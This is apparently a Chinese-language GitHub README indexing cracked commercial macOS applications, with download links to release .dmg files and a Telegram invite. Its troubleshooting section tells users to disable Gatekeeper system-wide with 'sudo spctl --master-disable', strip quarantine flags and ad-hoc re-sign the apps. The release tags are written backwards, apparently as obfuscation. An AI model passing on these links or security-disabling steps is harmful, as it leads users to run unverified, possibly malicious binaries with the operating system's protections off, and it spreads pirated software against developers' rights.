## macos -  CN

---------

[中文文档](https://github.com/YorkRaleign6/macos/blob/main/readme.md) | [English README](https://github.com/YorkRaleign6/macos/blob/main/readme-en.md)

--------


### 📖 简介

加入我们
telegram   https://t.me/+1q4fhbPDG2lkMzg1



欢迎来到我的 macOS 应用仓库。本仓库主要作为我个人搜集的各类 macOS 应用的索引分享。

> ⚠️ 免责声明：
>
> 本仓库所有资源均收集于互联网，仅供学习和研究使用。
>
> 如果您觉得软件好用，请购买正版以支持开发者。
>
> 如有侵权内容，请联系我进行删除。

### 📥 如何下载

1. 在下方的 [应用索引](#-应用索引)中找到你需要的软件。
2. 点击 **[下载]** 链接跳转到 **Releases** 页面。
3. 在 Assets 区域下载对应的 `.dmg` 或 `.zip` 文件。

### 🛠 常见问题 (必读：修复"文件已损坏")

MacOS 对未签名应用限制较多。如果你打开软件时提示 **"文件已损坏，无法打开"** 或 **"无法验证开发者"**，请按以下步骤操作：

#### 1. 开启"任何来源"

打开 **终端 (Terminal)**，输入以下命令并回车（需要输入开机密码）：

```
sudo spctl --master-disable
```

完成后，进入 **系统设置** -> **隐私与安全性**，确保"允许从以下位置下载的应用程序"已选择 **"任何来源"**。

#### 2. 绕过公证（修复损坏/闪退）

如果软件仍然打不开，这是最有效的解决方法。在终端执行以下命令：

```
sudo xattr -rd com.apple.quarantine /Applications/你的应用名称.app
```

*提示：你可以先输入 `sudo xattr -rd com.apple.quarantine ` (注意最后有个空格)，然后把应用程序从 Finder 拖进终端窗口，路径会自动生成。*

#### 3. 本地签名（备用方案）

如果上述方法无效，尝试手动签名：

```
sudo codesign --force --deep --sign - /Applications/你的应用名称.app
```

### 📂 应用索引

| **应用名称** | **版本** | **下载链接** |
| ------------ | -------- | ------------ |
| **2.6 Rotide** | 2.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.6_rotide_601/106_Editor_2.6_TNT.dmg) |
| **2Do** | 2.9.61 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.9.61_od2/2Do_2.9.61_TNT.dmg) |
| **4K Tokkit** | 25.4.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/25.4.1_tikkot_k4/4K_Tokkit_25.4.1_TNT.dmg) |
| **4K Video Downloader** | 25.4.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/25.4.2_redaolnwod_oediv_k4/4K_Video_Downloader_25.4.2_TNT.dmg) |
| **4K Youtube To Mp3** | 25.4.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/25.4.2_3pm_ot_ebutuoy_k4/4K_YouTube_to_MP3_25.4.2_TNT.dmg) |
| **A Better Finder Rename** | 12.21 | [下载](https://github.com/YorkRaleign6/macos/releases/download/12_emaner_rednif_retteb_a/A_Better_Finder_Rename_12_12.21_TNT.dmg) |
| **Acdsee Photo Studio** | 26.0.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/26_oiduts_otohp_eesdca/ACDSee_Photo_Studio_26_26.0.0_TNT.dmg) |
| **Activedock** | 2.2.850 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_058.2.2_kcodevitca/ActiveDock_2.2.850.dmg) |
| **Adobe Audition** | 25.6.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2025_noitidua_eboda/Adobe_Audition_2025_25.6.0_ARM.dmg) |
| **Adobe Media Encoder** | 25.6.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2025_redocne_aidem_eboda/Adobe_Media_Encoder_2025_25.6.0_ARM.dmg) |
| **Aiarty Image Enhancer** | 3.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.5_recnahne_egami_ytraia/Aiarty_Image_Enhancer_3.5_TNT.dmg) |
| **Aiarty Image Matting** | 2.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.6_gnittam_egami_ytraia/Aiarty_Image_Matting_2.6_TNT.dmg) |
| **Aiarty Video Enhancer** | 3.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.0_recnahne_oediv_ytraia/Aiarty_Video_Enhancer_3.0_TNT.dmg) |
| **Airfoil** | 5.12.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.12.6_liofria/Airfoil_5.12.6_EDiSO.dmg) |
| **Airradar** | 7.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/7.6_radarria/AirRadar_7.6_TNT.dmg) |
| **Aiseesoft Mac Data Recovery** | 1.8.32 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.8.32_yrevocer_atad_cam_tfoseesia/Aiseesoft_Mac_Data_Recovery_1.8.32_156558_TNT.dmg) |
| **All To Mp3 Converter** | 5.3.8 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.3.8_retrevnoc_3pm_ot_lla/All_To_MP3_Converter_5.3.8_MAS_TNT.dmg) |
| **Almighty** | 2.9.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_5.9.2_ythgimla/Almighty_2.9.5.dmg) |
| **Alttab** | 7.32.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_0.23.7_battla/AltTab_7.32.0.dmg) |
| **Anytrans** | 8.9.14 | [下载](https://github.com/YorkRaleign6/macos/releases/download/8.9.14_snartyna/AnyTrans_8.9.14_20251127_TNT.dmg) |
| **Apolloone** | 4.0.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_6.0.4_enoollopa/ApolloOne_4.0.6.dmg) |
| **Apu Software Dynamics Optimizer** | 4.6.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.6.4_rezimitpo_scimanyd_erawtfos_upa/APU_Software_Dynamics_Optimizer_4.6.1.dmg) |
| **Art Text** | 4.5.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4_txet_tra/Art_Text_4_4.5.6_TNT.dmg) |
| **Aspect Ratio** | 2.25 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.25_oitar_tcepsa/Aspect_Ratio_2.25_MAS_TNT.dmg) |
| **Audio Hijack** | 4.5.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.5.6_kcajih_oidua/Audio_Hijack_4.5.6_TNT.dmg) |
| **Audiobook Builder** | 2.2.9 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.2.9_redliub_kooboidua/Audiobook_Builder_2.2.9_TNT.dmg) |
| **Bandizip365** | 7.36 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_63.7_563pizidnab/Bandizip365_7.36.dmg) |
| **Bartender 6** | 6.2.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6_rednetrab/Bartender_6_6.2.1_TNT.dmg) |
| **Bbe Sound Stomp Board** | 1.7.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.7.1_draob_pmots_dnuos_ebb/BBE_Sound_Stomp_Board_1.7.1_HCiSO.dmg) |
| **Bear** | 2.6.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_4.6.2_raeb/Bear_2.6.4.dmg) |
| **Betterdisplay** | 4.0.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.0.4_yalpsidretteb/BetterDisplay_4.0.4_atb.dmg) |
| **Bike** | 1.22 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.22_ekib/Bike_1.22-194_TNT.dmg) |
| **Binary Ninja** | 5.1.8104 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.1.8104_ajnin_yranib/Binary_Ninja_5.1.8104_Personal.dmg) |
| **Bitwig Studio** | 6.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6.0_oiduts_giwtib/Bitwig_Studio_6.0_Beta_6.dmg) |
| **Bloom** | 1.5.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.5.6_moolb/Bloom_1.5.6_EDiSO.dmg) |
| **Bookends** | 15.2.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_2.2.51_sdnekoob/Bookends_15.2.2.dmg) |
| **Boxy Svg** | 4.90.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.90.0_gvs_yxob/Boxy_SVG_4.90.0_MAS_TNT.dmg) |
| **Busycontacts** | 2025.4.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.4.5202_stcatnocysub/BusyContacts_2025.4.1.dmg) |
| **Cardhop 2** | 2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2_pohdrac/Cardhop_2_4_3_TNT.iso) |
| **Cleanclip** | 2.4.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_5.4.2_pilcnaelc/CleanClip_2.4.5.dmg) |
| **Cleanshot X** | 4.8.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_5.8.4_x_tohsnaelc/CleanShot_X_4.8.5.dmg) |
| **Cloudmounter** | 4.16 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.16_retnuomduolc/CloudMounter_4.16_TNT.dmg) |
| **Color Folder** | 4.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.2_redlof_roloc/Color_Folder_4.2_MAS_TNT.dmg) |
| **Commander One Pro** | 3.17.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.17.2_orp_eno_rednammoc/Commander_One_PRO_3.17.2_MAS_TNT.dmg) |
| **Compressor** | 4.11.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.11.1_rosserpmoc/Compressor_4.11.1_MAS_TNT.dmg) |
| **Cookie** | 8.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/8.1_eikooc/Cookie_8.1_EDiSO.dmg) |
| **Crossover Preview** | 20251106 | [下载](https://github.com/YorkRaleign6/macos/releases/download/20251106_weiverp_revossorc/CrossOver_Preview_20251106_TNT.dmg) |
| **Dato** | 5.6.8 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.6.8_otad/Dato_5.6.8_MAS_TNT.dmg) |
| **Dcommander** | 3.10.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.10.0_rednammocd/DCommander_3.10.0_TNT.dmg) |
| **Default Folder X** | 6.2.3 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6.2.3_x_redlof_tluafed/Default_Folder_X_6.2.3_TNT.dmg) |
| **Disk Drill** | 6.1.2109 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6.1.2109_llird_ksid/Disk_Drill_6.1.2109_TNT.dmg) |
| **Djay Pro** | 5.5.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.5.2_orp_yajd/djay_Pro_5.5.2_TNT.dmg) |
| **Dmg Canvas** | 4.2.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.2.2_savnac_gmd/DMG_Canvas_4.2.2_EDiSO.dmg) |
| **Dockflow** | 1.57 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_75.1_wolfkcod/DockFlow_1.57.dmg) |
| **Dockview** | 1.7.3 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_3.7.1_weivkcod/DockView_1.7.3.dmg) |
| **Downie** | 4.11.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.11.6_einwod/Downie_4.11.6_5078.dmg) |
| **Dropdmg** | 3.7.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.7.1_gmdpord/DropDMG_3.7.1_EDiSO.dmg) |
| **Dropshare 6** | 6.8.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6_erahspord/Dropshare_6_6.8.0_TNT.dmg) |
| **Dropzone 4** | 4.80.74 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4_enozpord/Dropzone_4_4.80.74_TNT.dmg) |
| **Dynamic Wallpaper** | 24.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/24.1_repapllaw_cimanyd/Dynamic_Wallpaper_24.1_MAS_TNT.dmg) |
| **Dynamiclakepro** | 1.7.1.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.1.7.1_orpekalcimanyd/DynamicLakePro_1.7.1.1.dmg) |
| **Eazydraw** | 12.2.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/12.2.4_wardyzae/EazyDraw_12.2.4_MAS_TNT.dmg) |
| **Ebookbinder** | 1.12.9 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.12.9_rednibkoobe/eBookBinder_1.12.9_TNT.dmg) |
| **Edgeview** | 5.6.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.6.5_weivegde/EdgeView_5.6.5_MAS_TNT.dmg) |
| **Extradock** | 4.0.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_0.0.4_kcodartxe/extraDock_4.0.0.dmg) |
| **Feeder** | 4.8.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.8.2_redeef/Feeder_4.8.2_TNT.dmg) |
| **Festivitas** | 1.9.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_2.9.1_sativitsef/Festivitas_1.9.2.dmg) |
| **Ffworks** | 4.7.1.3.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.3.1.7.4_skrowff/ffWorks_4.7.1.3.1.dmg) |
| **File Cabinet Pro** | 8.7.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/8.7.0_orp_tenibac_elif/File_Cabinet_Pro_8.7.0_TNT.dmg) |
| **Finder Windows** | 1.5.18 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.5.18_swodniw_rednif/Finder_Windows_1.5.18_TNT.dmg) |
| **Flow** | 4.6.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.6.4_wolf/Flow_4.6.1.dmg) |
| **Folder Quick Look** | 1.3 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_3.1_kool_kciuq_redlof/Folder_Quick_Look_1.3.dmg) |
| **Fork** | 2.60.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.60.1_krof/Fork_2.60.1_TNT.dmg) |
| **Forklift** | 4.4.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.4.4_tfilkrof/ForkLift_4.4.4_TNT.dmg) |
| **Ghost Buster Pro** | 4.0.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.0.4_orp_retsub_tsohg/Ghost_Buster_Pro_4.0.4_MAS_TNT.dmg) |
| **Gluemotion** | 2.3.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.3.0_noitomeulg/GlueMotion_2.3.0_TNT.dmg) |
| **Glyphs 3** | 3.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3_shpylg/Glyphs_3_3.5.dmg) |
| **Hazel** | 6.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.6_lezah/Hazel_6.1.dmg) |
| **Ibarcoder** | 3.17.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.17.2_redocrabi/iBarcoder_3.17.2_TNT.dmg) |
| **Iclip** | 5.5.9 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.5.9_pilci/iClip_5.5.9_TNT.dmg) |
| **Icollections** | 9.5.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.5.9_snoitcelloci/iCollections_9.5.1.dmg) |
| **Image Resizer** | 4.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.2_reziser_egami/Image_Resizer_4.2_MAS_TNT.dmg) |
| **Inet Network Scanner** | 3.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.2_rennacs_krowten_teni/iNet_Network_Scanner_3.2_MAS_TNT.dmg) |
| **Istat Menus** | 7.20 | [下载](https://github.com/YorkRaleign6/macos/releases/download/7.20_sunem_tatsi/iStat_Menus_7.20-2262.dmg) |
| **Kcncrew Pack** | 25 | [下载](https://github.com/YorkRaleign6/macos/releases/download/25_kcap_wercnck/KCNcrew_Pack_25_11-15-25.iso) |
| **Keep It** | 2.7.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.7.6_ti_peek/Keep_It_2.7.6_TNT.dmg) |
| **Lanscan** | 8.0.23 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_32.0.8_nacsnal/LanScan_8.0.23.dmg) |
| **Lasso** | 1.8.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_2.8.1_ossal/Lasso_1.8.2.dmg) |
| **Leech** | 3.2.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.2.1_hceel/Leech_3.2.1_EDiSO.dmg) |
| **Library Monkey** | 5.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.5_yeknom_yrarbil/Library_Monkey_5.5_TNT.dmg) |
| **Library Monkey Pro** | 3.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.5_orp_yeknom_yrarbil/Library_Monkey_Pro_3.5_TNT.dmg) |
| **Lingon Pro** | 10.1.3 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_3.1.01_orp_nognil/Lingon_Pro_10.1.3.dmg) |
| **Live Home 3D Pro** | 4.11.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.11.1_orp_d3_emoh_evil/Live_Home_3D_Pro_4.11.1_TNT.dmg) |
| **Lunar** | 6.9.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6.9.5_ranul/Lunar_6.9.5_atb.dmg) |
| **Lungo** | 2.7.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.7.2_ognul/Lungo_2.7.2_MAS_TNT.dmg) |
| **Macx Dvd Ripper Pro** | 6.8.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6.8.4_orp_reppir_dvd_xcam/MacX_DVD_Ripper_Pro_6.8.4_TNT.dmg) |
| **Macxvideo Ai** | 3.9.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.9.0_ia_oedivxcam/Macxvideo_AI_3.9.0_TNT.dmg) |
| **Magic Battery** | 9.2.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/9.2.2_yrettab_cigam/Magic_Battery_9.2.2_MAS_TNT.dmg) |
| **Magic Disk Cleaner** | 4.1.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.1.1_renaelc_ksid_cigam/Magic_Disk_Cleaner_4.1.1_MAS_TNT.dmg) |
| **Mathcapture** | 1.8.99 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_99.8.1_erutpachtam/MathCapture_1.8.99.dmg) |
| **Mellel 6** | 6.5.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6_lellem/Mellel_6_6.5.5b65502_TNT.dmg) |
| **Mercury** | 3.0.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_5.0.3_yrucrem/Mercury_3.0.5.dmg) |
| **Millumin5 5.12.T** | 5.12 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_t.21.5_5nimullim/Millumin5_5.12.t_TNT.dmg) |
| **Moho Pro** | 14.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_4.41_orp_ohom/Moho_Pro_14.4.dmg) |
| **Money Pro** | 2.11.18 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.11.18_orp_yenom/Money_Pro_2.11.18_MAS_TNT.dmg) |
| **Monodraw** | 1.7.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.7.1_wardonom/Monodraw_1.7.1_EDiSO.dmg) |
| **Moom 4** | 4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4_moom/Moom_4_4.iso) |
| **Mountain Duck** | 5.1.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_0.1.5_kcud_niatnuom/Mountain_Duck_5.1.0.dmg) |
| **Mouseboost Pro** | 3.9.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.9.2_orp_tsoobesuom/MouseBoost_Pro_3.9.2_MAS_TNT.dmg) |
| **Mp3Tag** | 1.9.13 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.9.13_gat3pm/Mp3tag_1.9.13_EDiSO.dmg) |
| **Multitouch** | 1.40 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.40_hcuotitlum/Multitouch_1.40_TNT.dmg) |
| **Mweb Pro** | 4.7.8 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.7.8_orp_bewm/MWeb_Pro_4.7.8_TNT.dmg) |
| **Navicat Premium** | 17.3.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/Navicat_Premium_v17.3.5/Navicat_Premium_17.3.5.dmg) |
| **Nch Software Crescendo Masters** | 11.28 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_82.11_sretsam_odnecserc_erawtfos_hcn/NCH_Software_Crescendo_Masters_11.28.dmg) |
| **Networker Pro** | 11.0.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/11.0.4_orp_rekrowten/NetWorker_Pro_11.0.4_MAS_TNT.dmg) |
| **Noir** | 2025.2.7 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2025.2.7_rion/Noir_2025.2.7_MAS_TNT.dmg) |
| **Nookx** | 2025.11.20 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_02.11.5202_xkoon/NookX_2025.11.20.dmg) |
| **Notchbox** | 1.1.58 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_85.1.1_xobhcton/NotchBox_1.1.58.dmg) |
| **Noteplan** | 3.19.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_2.91.3_nalpeton/NotePlan_3.19.2.dmg) |
| **Oka Unarchiver** | 2.1.10 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2_revihcranu_ako/Oka_Unarchiver_2_2.1.10_MAS_TNT.dmg) |
| **Omnigraffle** | 7.25.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/7.25.1_elffarginmo/OmniGraffle_7.25.1_TNT.dmg) |
| **Omnizip** | 2.3.6 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.3.6_pizinmo/OmniZip_2.3.6_MAS_TNT.dmg) |
| **On1 Photo Raw Max** | 20.1.0.17749 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2026_xam_war_otohp_1no/ON1_Photo_RAW_MAX_2026_1_20.1.0.17749_TNT.dmg) |
| **One Switch** | 1.35.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.35.2_hctiws_eno/One_Switch_1.35.2_TNT.dmg) |
| **Openin** | 4.3.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_4.3.4_ninepo/OpenIn_4.3.4.dmg) |
| **Optimage** | 3.5.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.5.1_egamitpo/Optimage_3.5.1_TNT.dmg) |
| **Parallels Desktop** | 26.1.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/26.1.2_potksed_slellarap/Parallels_Desktop_26.1.2-57293_SIP_ON_and_OFF.dmg) |
| **Pastenow** | 2.26 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_62.2_wonetsap/PasteNow_2.26.dmg) |
| **Path Finder** | 2206 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2206_rednif_htap/Path_Finder_2206_TNT.dmg) |
| **Pdf Printer Register** | 6.6.8 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6.6.8_retsiger_retnirp_fdp/PDF_Printer_Register_6.6.8_TNT.dmg) |
| **Pdfelement** | 12.1.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/12.1.0_tnemelefdp/PDFelement_12.1.0_TNT.dmg) |
| **Perfectly Clear Workbench** | 4.8.0.2871 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4_hcnebkrow_raelc_yltcefrep/Perfectly_Clear_Workbench_v4_4.8.0.2871_TNT.dmg) |
| **Permute** | 3.14.3 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.14.3_etumrep/Permute_3.14.3_EDiSO.dmg) |
| **Phonerescue** | 4.3.1.20251105 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.3.1.20251105_eucserenohp/PhoneRescue_4.3.1.20251105_TNT.dmg) |
| **Photomill X** | 3.1.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.1.1_x_llimotohp/PhotoMill_X_3.1.1_TNT.dmg) |
| **Photosrevive** | 2.2.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.2.0_eviversotohp/PhotosRevive_2.2.0_TNT.dmg) |
| **Photosweeper X** | 5.2.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.2.0_x_repeewsotohp/PhotoSweeper_X_5.2.0_TNT.dmg) |
| **Piezo** | 1.9.8 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.9.8_ozeip/Piezo_1.9.8_TNT.dmg) |
| **Posterino** | 6.1.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_2.1.6_oniretsop/Posterino_6.1.2.dmg) |
| **Postico 2** | 2.2.3 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2_ocitsop/Postico_2_2.2.3.dmg) |
| **Potplayerx** | 1.3.26 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.3.26_xreyalptop/PotPlayerX_1.3.26_MAS_TNT.dmg) |
| **Prizmo** | 5.0.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.0.5_omzirp/Prizmo_5.0.1.dmg) |
| **Prompt** | 3.1.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.1.1_tpmorp/Prompt_3.1.1_EDiSO.dmg) |
| **Proxyman** | 6.1.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6.1.0_namyxorp/Proxyman_6.1.0_EDiSO.dmg) |
| **Pulltube** | 1.8.6.13 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.8.6.13_ebutllup/PullTube_1.8.6.13_TNT.dmg) |
| **Qlab** | 5.5.7 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.5.7_balq/QLab_5.5.7_TNT.dmg) |
| **Rapidweaver** | 9.6.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/9.6.5_revaewdipar/RapidWeaver_9.6.5_Dokdo.dmg) |
| **Raycast** | 1.103.8 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_8.301.1_tsacyar/Raycast_1.103.8.dmg) |
| **Recoveritloader** | 14.0.4.13 | [下载](https://github.com/YorkRaleign6/macos/releases/download/14.0.4.13_redaoltirevocer/RecoveritLoader_14.0.4.13_TNT.dmg) |
| **Rectangle Pro** | 3.64 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.64_orp_elgnatcer/Rectangle_Pro_3.64_TNT.dmg) |
| **Repo Prompt** | 1.5.32 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_23.5.1_tpmorp_oper/Repo_Prompt_1.5.32.dmg) |
| **Rightfont** | 9.8.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/9.8.0_tnofthgir/RightFont_9.8.0_TNT.dmg) |
| **SQLPro Studio** | 2025.78 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2025.78_oiduts_orplqs/SQLPro_Studio_2025.78_TNT.dmg) |
| **Scapple** | 1.5.4 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.5.4_elppacs/Scapple_1.5.4_TNT.dmg) |
| **Scherlokk** | 7.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_0.7_kkolrehcs/Scherlokk_7.0.dmg) |
| **Screen Studio** | 3.5.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.5.1_oiduts_neercs/Screen_Studio_3.5.1-4051.dmg) |
| **ScreenFlow** | 10.5.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/10.5.1_wolfneercs/ScreenFlow_10.5.1_TNT.dmg) |
| **Serato** | 4.0.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_otares/Serato_DJ_Pro_Suite_4.0.0.dmg) |
| **Serato Studio** | 2.4.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_0.4.2_oiduts_otares/Serato_Studio_2.4.0.dmg) |
| **Shottr** | 1.9.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_0.9.1_rttohs/Shottr_1.9.0.dmg) |
| **Sidebar** | 1.9.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.0.0_1.9.1_rabedis/Sidebar_1.9.1.dmg) |
| **Simplemind** | 2.8.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2.8.0_dnimelpmis/SimpleMind_2.8.0_MAS_TNT.dmg) |
| **Sitesucker Pro** | 6.0.2 | [下载](https://github.com/YorkRaleign6/macos/releases/download/6.0.2_orp_rekcusetis/SiteSucker_Pro_6.0.2_TNT.dmg) |
| **Sizemypics** | 1.8.1 | [下载](https://github.com/YorkRaleign6/macos/releases/download/1.8.1_scipymezis/SizeMyPics_1.8.1_TNT.dmg) |
| **Sketch** | 2025.3 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2025.3_hcteks/Sketch_2025.3_TNT.dmg) |
| **Snagit** | 2024.4.8 | [下载](https://github.com/YorkRaleign6/macos/releases/download/2024.4.8_tigans/Snagit_2024.4.8_TNT.dmg) |
| **Snapmotion** | 5.3.0 | [下载](https://github.com/YorkRaleign6/macos/releases/download/5.3.0_noitompans/SnapMotion_5.3.0_MAS_TNT.dmg) |
| **Sound Grinder** | 4.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/4.5_rednirg_dnuos/Sound_Grinder_4.5_TNT.dmg) |
| **Sound Grinder Pro** | 3.5 | [下载](https://github.com/YorkRaleign6/macos/releases/download/3.5_orp_rednirg_dnuos/Sound_Grinder_Pro_3.5_TNT.dmg) |
